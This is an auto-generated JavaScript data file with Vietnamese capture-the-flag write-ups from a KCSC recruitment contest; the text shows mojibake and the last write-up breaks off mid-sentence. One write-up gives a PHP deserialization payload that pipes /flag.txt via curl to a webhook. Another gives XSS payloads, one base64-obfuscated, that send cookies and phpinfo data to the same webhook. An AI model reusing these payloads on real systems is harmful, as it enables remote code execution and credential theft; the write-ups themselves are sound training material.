// AUTO-GENERATED FILE
export const competitionsData = [
  {
    "id": "kcsc_recruitment_2026",
    "name": "KCSC Recruitment 2026",
    "date": "15-12-2025",
    "description": "Cu·ªôc thi tuy·ªÉn th√†nh vi√™n KCSC nƒÉm 2025.",
    "bgGradient": "",
    "status": "ended",
    "totalPoints": 1964,
    "challenges": [
      {
        "id": "Bay-Vien-Bi-Rong",
        "slug": "bay_vien_bi_rong",
        "title": "B·∫£y Vi√™n Ng·ªçc R·ªìng",
        "category": "Web",
        "author": "bashu",
        "points": 50,
        "difficulty": "Medium",
        "readTime": "5 min",
        "date": "15-12-2025",
        "description": "Thu th·∫≠p bi r·ªìng -> RCE -> Flag",
        "content": "\r\n# TL;DR\r\n\r\nTrang web c√≥ t√≠nh nƒÉng ƒëƒÉng nh·∫≠p m·ªói ng√†y ƒë·ªÉ thu th·∫≠p 7 vi√™n ng·ªçc r·ªìng. Khi c√≥ ƒë·ªß 7 vi√™n th√¨ ta c√≥ th·ªÉ g·ªçi r·ªìng th·∫ßn shenron ƒë·ªÉ ∆∞·ªõc. L·ªó h·ªïng n·∫±m ·ªü vi·ªác server b·∫•t c·∫©n khi unserialize token c·ªßa ng∆∞·ªùi d√πng d·∫´n ƒë·∫øn vi·ªác k√≠ch ho·∫°t m·ªôt h√†m b·∫•t k√¨ v·ªõi ƒë·ªëi s·ªë b·∫•t k√¨ -> RCE\r\n\r\n# Initial reconnaissance\r\n\r\nT·∫£i th∆∞ m·ª•c **public.zip** v·ªÅ v√† gi·∫£i n√©n m√¨nh c√≥ th∆∞ m·ª•c nh∆∞ sau:\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Bay_Vien_Bi_Rong/image.png)\r\n\r\nTa bi·∫øt flag n·∫±m ·ªü `/flag.txt` th√¥ng qua file docker\r\n\r\n**Dockerfile**\r\n\r\n```Dockerfile\r\nFROM php:8.1-apache\r\n\r\nCOPY ./deploy /var/www/html/\r\n\r\nCOPY ./flag.txt /flag.txt\r\nRUN chown root:root /flag.txt && \\\r\n    chmod 644 /flag.txt\r\n...\r\n```\r\n\r\nSau khi ng·ªìi ph√¢n t√≠ch ƒë·ªëng file trong th∆∞ m·ª•c **classes** th√¨ m√¨nh nh·∫≠n th·∫•y c√≥ l·ªó h·ªïng ·ªü `Wish.php` v√† `Shenron.php`:\r\n\r\n**Wish.php**\r\n\r\n```php\r\n<?php\r\nclass Wish {\r\n    public $content;\r\n    public $callback;\r\n\r\n    public function __toString() {\r\n        return $this->content ?? '';\r\n    }\r\n\r\n    public function grant() {\r\n        if ($this->callback && $this->content) {\r\n            return ($this->callback)($this->content);\r\n        }\r\n        return false;\r\n    }\r\n}\r\n?>\r\n```\r\n\r\nL·ªó h·ªïng ·ªü ƒë√¢y n·∫±m ·ªü d√≤ng `return ($this->callback)($this->content);`\r\n\r\nTrong PHP `(input_1)(input_2)` t∆∞∆°ng t·ª± v·ªõi vi·ªác ta g·ªçi h√†m **input_1** v·ªõi ƒë·ªëi s·ªë l√† **input_2**\r\n\r\nHay n√≥i c√°ch kh√°c l√† `input_1(\"input_2\")`\r\n\r\nDo ƒë√≥ n·∫øu nh∆∞ ta ki·ªÉm so√°t ƒë∆∞·ª£c gi√° tr·ªã c·ªßa `$content` v√† `$callback` th√¨ ho√†n to√†n c√≥ th·ªÉ k√≠ch ho·∫°t ƒë∆∞·ª£c RCE\r\n\r\n**Shenron.php**\r\n\r\n```php\r\n<?php\r\nclass Shenron {\r\n    public $balls_collected = 0;\r\n    public $current_wish = null;\r\n    public $summoned_at = null;\r\n\r\n    public function __wakeup() {}\r\n\r\n    public function __destruct() {\r\n        if ($this->balls_collected === 7 && $this->current_wish instanceof Wish) {\r\n            $this->summoned_at = date('Y-m-d H:i:s');\r\n            $this->current_wish->grant();\r\n        }\r\n    }\r\n\r\n    public function speak() {\r\n        return \"TA L√Ä SHENRON! NG∆Ø∆†I C√ì TH·ªÇ ƒê∆Ø·ª¢C BAN M·ªòT ƒêI·ªÄU ∆Ø·ªöC!\";\r\n    }\r\n}\r\n?>\r\n```\r\n\r\nL·ªó h·ªïng n·∫±m ·ªü method **\\_\\_destruct()**, n·∫øu nh∆∞ ƒëi·ªÅu ki·ªán ƒë∆∞·ª£c th·ªèa m√£n th√¨ n√≥ s·∫Ω g·ªçi h√†m **grant()** `$current_wish`\r\n\r\nM√† nh∆∞ ƒë√£ ph√¢n t√≠ch ·ªü trong `Wish.php`, h√†m grant() s·∫Ω c√≥ th·ªÉ g·ªçi t·ªõi m·ªôt h√†m nguy hi·ªÉm nh∆∞ **system** n·∫øu nh∆∞ ta c√≥ th·ªÉ ki·ªÉm so√°t c√°c gi√° tr·ªã c·ªßa n√≥\r\n\r\n---\r\n\r\nTi·∫øp t·ª•c l·∫ßn m√≤ source code th√¨ m√¨nh ph√°t hi·ªán ra ƒëi·ªÉm ƒë√°ng ch√∫ √Ω ti·∫øp theo n·∫±m ·ªü hai file `index.php` v√† `config.php`\r\n\r\n**config.php**\r\n\r\n```php\r\n<?php\r\ndefine('MAX_DRAGON_BALLS', 7);\r\ndefine('SITE_NAME', 'DRAGON BALL HUNT');\r\ndefine('COOKIE_NAME', 'dragonball');\r\ndefine('COOKIE_EXPIRE', time() + (86400 * 30));\r\n\r\nif (!file_exists('data')) {\r\n    mkdir('data', 0777, true);\r\n}\r\nrequire_once 'classes/User.php';\r\nrequire_once 'classes/Database.php';\r\nrequire_once 'classes/Wish.php';\r\nrequire_once 'classes/Shenron.php';\r\n\r\nfunction getCurrentUser() {\r\n    if (!isset($_COOKIE[COOKIE_NAME])) return null;\r\n\r\n    $data = base64_decode($_COOKIE[COOKIE_NAME]);\r\n    if ($data === false) return null;\r\n\r\n    $user = @unserialize($data);\r\n    if (!$user instanceof User) return null;\r\n    if ($user->dragon_balls > 7) {\r\n        $user->dragon_balls = 7;\r\n    }\r\n    return $user;\r\n}\r\n\r\nfunction setUserCookie($user) {\r\n    $serialized = serialize($user);\r\n    $encoded = base64_encode($serialized);\r\n    setcookie(COOKIE_NAME, $encoded, COOKIE_EXPIRE, \"/\");\r\n    $_COOKIE[COOKIE_NAME] = $encoded;\r\n}\r\n\r\nfunction clearUserCookie() {\r\n    setcookie(COOKIE_NAME, \"\", time() - 3600, \"/\");\r\n    unset($_COOKIE[COOKIE_NAME]);\r\n}\r\n?>\r\n```\r\n\r\nPh√¢n t√≠ch h√†m `getCurrentUser()` m√¨nh c√≥ ƒë∆∞·ª£c nh·ªØng th√¥ng tin sau\r\n\r\n- ƒê·∫ßu ti√™n m√°y ch·ªß s·∫Ω l·∫•y cookie t√™n l√† `dragonball` v√† decode n√≥ base64\r\n\r\n- N·∫øu nh∆∞ n√≥ t·ªìn t·∫°i v√† l√† m·ªôt d·∫°ng base64 h·ª£p l·ªá th√¨ s·∫Ω ti·∫øn h√†nh unserialize v√† ki·ªÉm tra xem n√≥ c√≥ ph·∫£i m·ªôt instance c·ªßa class **User** hay kh√¥ng, n·∫øu kh√¥ng th√¨ return null c√≤n c√≥ th√¨ l√†m cho bi·∫øn `$dragon_balls` t·ªëi ƒëa l√† 7\r\n\r\nƒêi·ªÉm ƒë√°ng ch√∫ √Ω n·∫±m ·ªü hai d√≤ng n√†y\r\n\r\n```php\r\n$user = @unserialize($data);\r\nif (!$user instanceof User) return null;\r\n```\r\n\r\nN·∫øu nh∆∞ `$data` kh√¥ng ph·∫£i l√† m·ªôt instance c·ªßa class **User** th√¨ m√°y ch·ªß s·∫Ω kh√¥ng l√†m g√¨ c·∫£, khi·∫øn cho phi√™n l√†m vi·ªác c·ªßa n√≥ k·∫øt th√∫c v√† k√≠ch ho·∫°t method **\\_\\_destruct()** n·∫øu c√≥\r\n\r\nV√† v√¨ trong file c√≥ include c·∫£ `Shenron.php` v√† `Wish.php` n√™n m√¨nh nghƒ© ngay t·ªõi vi·ªác t·∫°o ra m·ªôt class **Shenron** v·ªõi `$current_wish` l√† class **Wish** v·ªõi `$callback` l√† `system` c√≤n `$content` l√† l·ªánh ƒë·ªÉ l·∫•y flag\r\n\r\nV√† cu·ªëi c√πng ·ªü **index.php**\r\n\r\n```php\r\n<?php\r\nrequire_once 'config.php';\r\n\r\n$user = getCurrentUser();\r\n\r\nif (!$user) {\r\n    header('Location: login.php');\r\n    exit();\r\n}\r\n\r\n$message = '';\r\nif (isset($_POST['mark_attendance'])) {\r\n    if ($user->markAttendance()) {\r\n        $message_type = 'success';\r\n        $message = \"üéâ ƒêi·ªÉm danh th√†nh c√¥ng!\";\r\n        Database::updateUser($user);\r\n        setUserCookie($user);\r\n    } else {\r\n        $message_type = 'warning';\r\n        $message = \"‚ö†Ô∏è B·∫°n ƒë√£ ƒëi·ªÉm danh h√¥m nay r·ªìi!\";\r\n    }\r\n}\r\n\r\n$progress = ($user->attendance_days % 7);\r\n$progress_percent = ($progress / 7) * 100;\r\n$next_ball_days = 7 - $progress;\r\n?>\r\n\r\n<!DOCTYPE html>\r\n<html lang=\"vi\">\r\n<head>\r\n...\r\n```\r\n\r\nƒê√¢y l√† url ƒë·∫ßu ti√™n m√† web redirect t·ªõi khi ƒëƒÉng nh·∫≠p th√†nh c√¥ng\r\n\r\nV√† ·ªü ngay nh·ªØng d√≤ng ƒë·∫ßu ti√™n m√¨nh ƒë√£ th·∫•y h√†m `getCurrentUser()` ƒë∆∞·ª£c g·ªçi\r\n\r\n```php\r\n<?php\r\nrequire_once 'config.php';\r\n\r\n$user = getCurrentUser();\r\n...\r\n```\r\n\r\nV·∫≠y n√™n t·∫•t c·∫£ nh·ªØng g√¨ m√¨nh c·∫ßn l√†m b√¢y gi·ªù l√† craft m·ªôt c√°i cookie t√™n `dragonball` ƒë·ªôc h·∫°i l√† s·∫Ω gi·∫£i ƒë∆∞·ª£c b√†i n√†y\r\n\r\n# Exploit and get flag\r\n\r\nK·ªãch b·∫£n chi ti·∫øt s·∫Ω nh∆∞ sau\r\n\r\n- M√¨nh t·∫°o m·ªôt instance c·ªßa class **Shenron** ƒë·ªôc h·∫°i sau ƒë√≥ serialize n√≥, encode b·∫±ng base64, t·∫°o m·ªôt cookie c√≥ t√™n l√† **dragonball** v·ªõi n·ªôi dung l√† ƒëo·∫°n base64 v·ª´a t·∫°o\r\n\r\n- Ti·∫øn h√†nh truy c·∫≠p v√†o `index.php`\r\n\r\n- `index.php` g·ªçi t·ªõi h√†m `getCurrentUser()`\r\n\r\n- Sau khi check c√°c ƒëi·ªÅu ki·ªán th·ªèa m√£n th√¨ h√†m ti·∫øn h√†nh **deserialize** instance ƒë√≥\r\n\r\n- H√†m ki·ªÉm tra xem n√≥ c√≥ ph·∫£i m·ªôt instance c·ªßa **User** hay kh√¥ng v√† t·∫•t nhi√™n l√† s·∫Ω th·∫•t b·∫°i v√† return null\r\n\r\n- K·∫øt th√∫c phi√™n l√†m vi·ªác c·ªßa instance d·∫´n t·ªõi method `__destruct()` ƒë∆∞·ª£c g·ªçi v√† cu·ªëi c√πng l√† RCE\r\n\r\nScript ƒë·ªÉ t·∫°o instace ƒë√≥ nh∆∞ sau\r\n\r\n```php\r\n<?php\r\n\r\n# Cop nguy√™n si hai class Shenron v√† Wish\r\nclass Shenron {\r\n    public $balls_collected = 0;\r\n    public $current_wish = null;\r\n    public $summoned_at = null;\r\n\r\n    public function __wakeup() {}\r\n\r\n    public function __destruct() {\r\n        if ($this->balls_collected === 7 && $this->current_wish instanceof Wish) {\r\n            $this->summoned_at = date('Y-m-d H:i:s');\r\n            $this->current_wish->grant();\r\n        }\r\n    }\r\n\r\n    public function speak() {\r\n        return \"TA L√Ä SHENRON! NG∆Ø∆†I C√ì TH·ªÇ ƒê∆Ø·ª¢C BAN M·ªòT ƒêI·ªÄU ∆Ø·ªöC!\";\r\n    }\r\n}\r\n\r\nclass Wish {\r\n    public $content;\r\n    public $callback;\r\n\r\n    public function __toString() {\r\n        return $this->content ?? '';\r\n    }\r\n\r\n    public function grant() {\r\n        if ($this->callback && $this->content) {\r\n            return ($this->callback)($this->content);\r\n        }\r\n        return false;\r\n    }\r\n}\r\n\r\n$wish = new Wish();\r\n$shenron = new Shenron();\r\n\r\n# L·∫•y n·ªôi dung flag, encode n√≥ r·ªìi g·ª≠i qua webhook\r\n$wish->callback = \"system\";\r\n$wish->content = \"cat /flag.txt | base64 | xargs -I {} curl https://webhook.site/590bdf98-4b62-4539-b61e-4c2f034b8cdc/?data={}\";\r\n\r\n$shenron->balls_collected = 7; # ƒê·ªÉ th·ªèa m√£n ƒëi·ªÅu ki·ªán g·ªçi t·ªõi \"$this->current_wish->grant();\"\r\n$shenron->current_wish = $wish;\r\n\r\necho base64_encode(serialize($shenron));\r\n?>\r\n```\r\n\r\n**Output**: `Tzo3OiJTaGVucm9uIjozOntzOjE1OiJiYWxsc19jb2xsZWN0ZWQiO2k6NztzOjEyOiJjdXJyZW50X3dpc2giO086NDoiV2lzaCI6Mjp7czo3OiJjb250ZW50IjtzOjEwODoiY2F0IC9mbGFnLnR4dCB8IGJhc2U2NCB8IHhhcmdzIC1JIHt9IGN1cmwgaHR0cHM6Ly93ZWJob29rLnNpdGUvNTkwYmRmOTgtNGI2Mi00NTM5LWI2MWUtNGMyZjAzNGI4Y2RjLz9kYXRhPXt9IjtzOjg6ImNhbGxiYWNrIjtzOjY6InN5c3RlbSI7fXM6MTE6InN1bW1vbmVkX2F0IjtOO30=`\r\n\r\nL√†m theo k·ªãch b·∫£n tr√™n r·ªìi qua webhook l·∫•y data v·ªÅ decode ra l√† s·∫Ω c√≥ ƒë∆∞·ª£c flag\r\n\r\n**Flag**: `KCSC{Sh3nR0n_S4ys_y0Ur_w1sh_f0R_rc3_1s_Gr4Nt3d_M4sT3r!!}`\r\n",
        "tags": []
      },
      {
        "id": "Horis_Blog",
        "slug": "horis_blog",
        "title": "Hori's Blog",
        "category": "Web",
        "author": "bashu",
        "points": 50,
        "difficulty": "Easy",
        "readTime": "2 min",
        "date": "15-12-2025",
        "description": "flag in cookie and plz don't dirsearch",
        "content": "\r\n# TL;DR\r\n\r\nƒê√¢y l√† m·ªôt trang web cho ph√©p ng∆∞·ªùi d√πng ƒëƒÉng t·∫£i c√°c blog post l√™n. Ngo√†i ra c√≤n c√≥ m·ªôt con bot s·∫Ω g·ª≠i request t·ªõi endpoint m√† ng∆∞·ªùi d√πng nh·∫≠p v√†o v√† m·ªôt trang phpinfo. L·ªó h·ªïng n·∫±m ·ªü endpoint `view.php?id=` d√≠nh **XXS** n√™n ta khai th√°c n√≥ v√† l·∫•y ƒë∆∞·ª£c flag ·ªü cookie c·ªßa admin\r\n\r\n# Initial reconnaissance\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Horis_Blog/trang_chu.png)\r\n\r\nD·ª±a v√†o description, m√¨nh h∆∞·ªõng ngay lu√¥n t·ªõi vi·ªác t√¨m c√°ch ƒë·ªÉ l·∫•y cookie\r\n\r\nNgo√†i ra trang web c√≤n cho ph√©p vi·∫øt post v·ªõi n·ªôi dung t√πy √Ω v√† g·ª≠i cho bot n·ªØa n√™n m√¨nh nghƒ© ngay t·ªõi vi·ªác t√¨m c√°ch ƒë·ªÉ XSS\r\n\r\nTh·ª≠ ƒëƒÉng m·ªôt b√†i post v·ªõi n·ªôi dung l√† `<script>alert(1)</script>`\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Horis_Blog/thrthrth.png)\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Horis_Blog/Screenshot%202025-12-15%20002823.png)\r\n\r\nTuy·ªát v·ªùi XSS th√†nh c√¥ng ^^\r\n\r\nSau ƒë·∫•y m√¨nh ch·ªâ vi·ªác vi·∫øt payload g·ª≠i cookie v·ªÅ webhook c·ªßa m√¨nh l√† xong (ho·∫∑c l√† kh√¥ng)\r\n\r\n**Payload**: `` <script>fetch(`https://webhook.site/590bdf98-4b62-4539-b61e-4c2f034b8cdc/?data=${document.cookie}`)</script> ``\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Horis_Blog/gdfgregerg.png)\r\n\r\nƒê√£ nh·∫≠n ƒë∆∞·ª£c cookie c·ªßa m√¨nh. Sau ƒë√≥ m√¨nh ti·∫øn h√†nh g·ª≠i cho con bot\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Horis_Blog/bot.png)\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Horis_Blog/dsjfslkdfjef.png)\r\n\r\nT∆∞·ªüng m∆∞·ª£t nh∆∞ng m√† kh√¥ng :(\r\n\r\nM·∫∑c d√π ƒë√£ nh·∫≠n ƒë∆∞·ª£c request nh∆∞ng data th√¨ tr·ªëng tr∆°n, c√≥ th·ªÉ l√† v√¨ c·ªù HttpOnly c·ªßa bot ƒëang b·∫≠t\r\n\r\nƒêo·∫°n n√†y m√¨nh loay hoay m·ªôt h·ªìi kh√° l√¢u th√¨ nh·ªõ ra l√† c√≤n m·ªôt d·ªØ ki·ªán ch∆∞a ƒë·ªông t·ªõi l√† trang **phpinfo**\r\n\r\nNh√¨n qua c√°c ƒëo·∫°n d·ªØ li·ªáu th√¨ m√¨nh th·∫•y cookie c·ªßa m√¨nh xu·∫•t hi·ªán ·ªü trong ƒë√≥ lu√¥n\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Horis_Blog/phpinfo.png)\r\n\r\nTh·∫ø n√™n m√¨nh chuy·ªÉn h∆∞·ªõng sang t√¨m c√°ch khi·∫øn con bot fetch ƒëo·∫°n cookie ƒë√≥ r·ªìi m·ªõi g·ª≠i sang cho m√¨nh\r\n\r\n**Script l·∫•y cookie**:\r\n\r\n```javascript\r\nfetch(\"/phpinfo.php\")\r\n  .then((r) => r.text())\r\n  .then((r) => {\r\n    const i = r.indexOf(\"HTTP_COOKIE\");\r\n    const data = btoa(r.slice(i, i + 500)); // l·∫•y 500 k√≠ t·ª± ƒë·ªÉ tr√°nh url qu√° d√†i\r\n    fetch(\r\n      `https://webhook.site/590bdf98-4b62-4539-b61e-4c2f034b8cdc/?data=${data}`\r\n    );\r\n  });\r\n```\r\n\r\n**Payload** (m√¨nh encode l·∫°i ƒë·ªÉ tr√°nh khi render l√†m cho script b·ªã l·ªói):\r\n\r\n```html\r\n<script>\r\n  eval(\r\n    atob(\r\n      \"ZmV0Y2goJy9waHBpbmZvLnBocCcpLnRoZW4ociA9PiByLnRleHQoKSkudGhlbigKICByID0+IHsKICAgIGNvbnN0IGkgPSByLmluZGV4T2YoIkhUVFBfQ09PS0lFIik7CiAgICBjb25zdCBkYXRhID0gYnRvYShyLnNsaWNlKGksIGkgKyA1MDApKTsKICAgIGZldGNoKGBodHRwczovL3dlYmhvb2suc2l0ZS81OTBiZGY5OC00YjYyLTQ1MzktYjYxZS00YzJmMDM0YjhjZGMvP2RhdGE9JHtkYXRhfWApOwogIH0KKTs=\"\r\n    )\r\n  );\r\n</script>\r\n```\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Horis_Blog/gergergergfg.png)\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Horis_Blog/flag.png)\r\n\r\n**Flag**: `KCSC{PhP_InFO_d1sPl4Ys_c0okIe_iNf0rm4tiOn!!!}`\r\n",
        "tags": []
      },
      {
        "id": "Hoshino_Portal",
        "slug": "hoshino_portal",
        "title": "Hoshino Portal",
        "category": "Web",
        "author": "phughj",
        "points": 50,
        "difficulty": "Easy",
        "readTime": "6 min",
        "date": "15-12-2025",
        "description": "K·∫ª ngu n√≥i v·ªÅ qu√° kh·ª©, k·∫ª kh√¥n n√≥i v·ªÅ hi·ªán t·∫°i, ng∆∞·ªùi th√¥ng minh n√≥i v·ªÅ t∆∞∆°ng lai, ng∆∞·ªùi ch∆°i m·∫£ng web kh√¥ng th·ªÉ kh√¥ng l√†m b√†i n√†y.",
        "content": "\r\n# TL;DR\r\n\r\nM·ªôt trang web c√≥ ch·ª©c nƒÉng ƒëƒÉng k√≠, ƒëƒÉng nh·∫≠p v√† ƒë·ªïi m·∫≠t kh·∫©u. M·ª•c ti√™u c·ªßa m√¨nh l√† ph·∫£i t√¨m c√°ch ƒëƒÉng nh·∫≠p v√†o t√†i kho·∫£n admin ƒë·ªÉ l·∫•y flag. Y√™u c·∫ßu c·ªßa b√†i n√†y l√† khai th√°c vi·ªác b·∫£o m·∫≠t l·ªèng l·∫ªo ·ªü ch·ª©c nƒÉng ƒë·ªïi m·∫≠t kh·∫©u khi·∫øn ng∆∞·ªùi ch∆°i c√≥ th·ªÉ ƒë·ªïi ƒë∆∞·ª£c m·∫≠t kh·∫©u c·ªßa admin\r\n\r\n# Initial reconnaissance\r\n\r\nKhi t·∫°o t√†i kho·∫£n v√† ƒëƒÉng nh·∫≠p l·∫ßn ƒë·∫ßu m√¨nh nh·∫≠n ƒë∆∞·ª£c giao di·ªán nh∆∞ sau\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Hoshino_Portal/dfsdf.png)\r\n\r\nC√≥ v·∫ª l√† ph·∫£i t√¨m c√°ch ƒë·ªÉ ƒëƒÉng nh·∫≠p v√†o t√†i kho·∫£n c·ªßa admin r·ªìi\r\n\r\nKhi m·ªõi m·ªü chall l√™n m√¨nh th·∫•y c√≥ m·ªôt t√≠nh nƒÉng th∆∞·ªùng kh√¥ng xu·∫•t hi·ªán ·ªü nh·ªØng chall kh√°c l√† t√≠nh nƒÉng **reset password**\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Hoshino_Portal/sdfsdf.png)\r\n\r\n**Source code c·ªßa ph·∫ßn reset pasword**:\r\n\r\n**resetPassword.js**:\r\n\r\n```js\r\nconst express = require(\"express\");\r\nconst bcrypt = require(\"bcrypt\");\r\nconst { v4: uuidv4 } = require(\"uuid\");\r\nconst db = require(\"../config/database\");\r\nconst {\r\n  checkCodeReset,\r\n  updateCodeReset,\r\n} = require(\"../services/resetPasswordService\");\r\n\r\nconst router = express.Router();\r\n\r\nrouter.post(\"/resetpassword\", (req, res) => {\r\n  const { username, email, passwordnew, code_reset } = req.body;\r\n\r\n  if (!username || !email) {\r\n    return res.status(400).json({ error: \"Username and email are required\" });\r\n  }\r\n\r\n  const validateQuery =\r\n    \"SELECT 1 FROM users WHERE username = ? UNION SELECT 2 FROM users WHERE email = ?\";\r\n\r\n  db.query(validateQuery, [username, email], (error, results) => {\r\n    if (error) {\r\n      console.error(\"Validation error:\", error);\r\n      return res\r\n        .status(500)\r\n        .json({ error: \"Database error during validation\" });\r\n    }\r\n\r\n    if (results.length !== 2) {\r\n      return res.status(400).json({ error: \"Invalid username or email\" });\r\n    }\r\n\r\n    if (!code_reset || code_reset === \"\") {\r\n      let newResetCode;\r\n      if (email.toLowerCase().includes(\"admin\")) {\r\n        newResetCode = uuidv4();\r\n      } else {\r\n        const randomLetter = String.fromCharCode(\r\n          65 + Math.floor(Math.random() * 6)\r\n        );\r\n        const randomNumbers = Math.floor(10 + Math.random() * 90);\r\n        newResetCode = randomLetter + randomNumbers + randomLetter;\r\n      }\r\n      updateCodeReset(username, email, newResetCode, (error, resetCode) => {\r\n        if (error) {\r\n          return res.status(500).json({ error: \"Failed to create reset code\" });\r\n        }\r\n        res.json({\r\n          success: true,\r\n          message:\r\n            \"Reset code generated. Check your email (feature not yet implemented)\",\r\n        });\r\n      });\r\n    } else {\r\n      checkCodeReset(\r\n        username,\r\n        email,\r\n        code_reset.trim(),\r\n        async (error, isValid, errorMessage, resetData) => {\r\n          if (error) {\r\n            return res.status(500).json({ error: \"Database error\" });\r\n          }\r\n          if (!isValid) {\r\n            return res.status(400).json({ error: errorMessage });\r\n          }\r\n          if (!passwordnew) {\r\n            return res.status(400).json({ error: \"New password is required\" });\r\n          }\r\n\r\n          const hashedPassword = await bcrypt.hash(passwordnew, 10);\r\n\r\n          db.query(\r\n            \"UPDATE users SET password = ? WHERE username = ?\",\r\n            [hashedPassword, username],\r\n            (error, results) => {\r\n              if (error) {\r\n                return res\r\n                  .status(500)\r\n                  .json({ error: \"Failed to update password\" });\r\n              }\r\n              updateCodeReset(username, email, \"\", (err) => {\r\n                if (err) console.error(\"Failed to reset code:\", err);\r\n              });\r\n              res.json({\r\n                success: true,\r\n                message:\r\n                  \"Password reset successful! Please login with your new password.\",\r\n              });\r\n            }\r\n          );\r\n        }\r\n      );\r\n    }\r\n  });\r\n});\r\n\r\nmodule.exports = router;\r\n```\r\n\r\n**resetPasswordService.js**\r\n\r\n```js\r\nconst bcrypt = require(\"bcrypt\");\r\nconst { v4: uuidv4 } = require(\"uuid\");\r\nconst db = require(\"../config/database\");\r\n\r\nfunction checkCodeReset(username, email, code_reset, callback) {\r\n  db.query(\r\n    \"SELECT *, TIMESTAMPDIFF(MINUTE, createdate, NOW()) as minutes_elapsed FROM users_resetpassword WHERE username = ? AND email = ?\",\r\n    [username, email],\r\n    (error, results) => {\r\n      if (error) {\r\n        return callback(error, null);\r\n      }\r\n\r\n      if (results.length === 0) {\r\n        return callback(null, false, \"Invalid reset code\");\r\n      }\r\n\r\n      const resetData = results[0];\r\n\r\n      if (resetData.minutes_elapsed > 5) {\r\n        return callback(\r\n          null,\r\n          false,\r\n          \"Reset code has expired. Please request a new one.\"\r\n        );\r\n      }\r\n\r\n      if (resetData.code_reset !== code_reset) {\r\n        return callback(null, false, \"Invalid reset code\", resetData);\r\n      }\r\n\r\n      return callback(null, true, null, resetData);\r\n    }\r\n  );\r\n}\r\n\r\nfunction updateCodeReset(username, email, code_reset, callback) {\r\n  db.query(\r\n    \"SELECT * FROM users_resetpassword WHERE username = ? AND email = ?\",\r\n    [username, email],\r\n    (error, results) => {\r\n      if (error) {\r\n        return callback(error, null);\r\n      }\r\n      if (results.length > 0) {\r\n        db.query(\r\n          \"UPDATE users_resetpassword SET code_reset = ?, createdate = CURRENT_TIMESTAMP WHERE username = ? AND email = ?\",\r\n          [code_reset, username, email],\r\n          (error, results) => {\r\n            if (error) {\r\n              return callback(error, null);\r\n            }\r\n            return callback(null, code_reset);\r\n          }\r\n        );\r\n      } else {\r\n        db.query(\r\n          \"INSERT INTO users_resetpassword (username, email, code_reset) VALUES (?, ?, ?)\",\r\n          [username, email, code_reset],\r\n          (error, results) => {\r\n            if (error) {\r\n              return callback(error, null);\r\n            }\r\n            return callback(null, code_reset);\r\n          }\r\n        );\r\n      }\r\n    }\r\n  );\r\n}\r\n\r\nmodule.exports = {\r\n  checkCodeReset,\r\n  updateCodeReset,\r\n};\r\n```\r\n\r\nPh√¢n t√≠ch m·ªôt h·ªìi th√¨ m√¨nh c√≥ nh·∫≠n x√©t v·ªÅ c√°ch ho·∫°t ƒë·ªông c·ªßa n√≥ nh∆∞ sau:\r\n\r\n- Khi ng∆∞·ªùi ch∆°i g·ª≠i m·ªôt post request t·ªõi endpoint `/resetpassword` th√¨ m√°y ch·ªß s·∫Ω l·∫•y ra 4 tham s·ªë l√† `username`, `email`, `passwordnew` v√† `code_reset`\r\n\r\n- Sau ƒë√≥ m√°y ch·ªß ti·∫øp t·ª•c ki·ªÉm tra xem `username` v√† `email` c√≥ t·ªìn t·∫°i trong database kh√¥ng\r\n\r\n- Ti·∫øp ƒë√≥ s·∫Ω x·∫£y ra hai tr∆∞·ªùng h·ª£p\r\n\r\n  - N·∫øu kh√¥ng c√≥ tham s·ªë `code_reset` ho·∫∑c ƒë·ªëi s·ªë c·ªßa n√≥ r·ªóng th√¨ m√°y ch·ªß s·∫Ω ti·∫øn h√†nh t·∫°o m·ªôt c√°i t∆∞∆°ng ·ª©ng v·ªõi `username` v√† `email`\r\n\r\n  - N·∫øu t·ªìn t·∫°i tham s·ªë `code_reset` kh√¥ng r·ªóng th√¨ m√°y ch·ªß s·∫Ω ti·∫øn h√†nh ki·ªÉm tra xem c√≥ t·ªìn t·∫°i `code_reset` t∆∞∆°ng ·ª©ng v·ªõi `username` v√† `email` kh√¥ng, n·∫øu c√≥ th√¨ s·∫Ω ƒë·ªïi m·∫≠t kh·∫©u c·ªßa `username` th√†nh `passwordnew`\r\n\r\n# Exploit and get flag\r\n\r\nSau khi ph√¢n t√≠ch xong m√¨nh nh·∫≠n ra c√≥ hai l·ªó h·ªïng:\r\n\r\n1. **Kh√¥ng** m·ªôt l√∫c n√†o trong c·∫£ qu√° tr√¨nh reset password m√† m√°y ch·ªß check xem `username` v√† `email` c√≥ li√™n k·∫øt v·ªõi nhau kh√¥ng\r\n\r\n2. Code reset m√† m√°y ch·ªß t·∫°o ra **r·∫•t d·ªÖ** ƒë·ªÉ brute force n·∫øu email kh√¥ng c√≥ ch·ªØ **admin**\r\n\r\nPh√¢n t√≠ch th√™m v·ªÅ c√°ch m√† m√°y ch·ªß t·∫°o ra reset code:\r\n\r\n```js\r\nlet newResetCode;\r\nif (email.toLowerCase().includes('admin')) {\r\n    newResetCode = uuidv4();\r\n} else {\r\n    const randomLetter = String.fromCharCode(65 + Math.floor(Math.random() * 6));\r\n    const randomNumbers = Math.floor(10 + Math.random() * 90);\r\n    newResetCode = randomLetter + randomNumbers + randomLetter;\r\n}\r\nupdateCodeReset(username, email, newResetCode, (error, resetCode) => {\r\n...\r\n```\r\n\r\n- N·∫øu `email` c√≥ ch·ª©a \"admin\" th√¨ `newResetCode` s·∫Ω l√† m·ªôt chu·ªói k√≠ t·ª± r·∫•t kh√≥ ƒë·ªÉ ƒëo√°n\r\n\r\n- Nh∆∞ng n·∫øu kh√¥ng th√¨ c·∫•u tr√∫c c·ªßa `newResetCode` l·∫°i r·∫•t ƒë∆°n gi·∫£n\r\n\r\n  - **C·∫•u tr√∫c**: L + N + L\r\n\r\n  - **L**: c√°c k√≠ t·ª± c√≥ m√£ ASCII t·ª´ 65 ƒë·∫øn 65 + 6 _(v√¨ h√†m Math.random() tr·∫£ gi√° 